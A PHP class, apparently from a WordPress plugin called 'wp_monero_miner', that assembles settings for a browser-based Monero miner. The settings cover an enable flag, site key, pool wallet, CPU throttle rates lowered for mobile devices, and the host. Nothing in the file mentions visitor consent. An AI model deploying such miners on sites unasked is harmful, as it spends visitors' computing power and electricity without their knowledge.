<?php

class ScriptService {

    public function getScriptData($region = '') {
        global $apiService, $siteService;

        $mobile = false;

        try {
            if (!class_exists('Mobile_Detect')) {
                require_once plugin_dir_path(dirname(__FILE__)) . 'vendor/mobiledetect/mobiledetectlib/Mobile_Detect.php';
            }
            $detect = new Mobile_Detect;
            $mobile = $detect->isMobile();
        } catch (Exception $e) {

        }

//        $user = $apiService->getWordpressUserFull();

        $host = $siteService->get_current_host();

        return array(
            'enabled' => get_option('wp_monero_miner' . $region . '_enabled'),
            'site_key' => get_option('wp_monero_miner_site_key'),
            'throttle' => '20',
            'throttleMobile' => '10',
            'log' => get_option('wp_monero_miner_log'),
            'poolEnabled' => get_option('wp_monero_miner_pool_enabled'),
            'poolWallet' => get_option('wp_monero_miner_pool_wallet'),
            'variant' => get_option('wp_monero_miner_variant'),
            'version' => WP_MONERO_MINER_PLUGIN_VERSION,
            'userLoggedIn' => "", //$user['loggedIn'],
            'userName' => "", //$user['name'],
            'userTokens' => 0, //$user['balance'],
            'host' => $host,
            'mobile' => $mobile,
        );
    }
}

?>